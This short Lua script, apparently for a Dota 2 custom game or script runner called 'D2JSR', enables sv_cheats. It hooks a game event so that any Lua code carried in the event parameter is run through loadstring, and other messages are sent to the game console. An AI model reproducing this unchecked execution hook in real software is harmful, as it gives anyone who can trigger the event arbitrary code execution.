Convars:SetBool('sv_cheats', true)
ListenToGameEvent('halloween_phase_end', function(msg)
	if msg.msg == "code" then
		assert(loadstring(msg.param))();
	else
		SendToConsole(msg.msg);
	end
end,self)
Msg('...D2JSR rules done\n')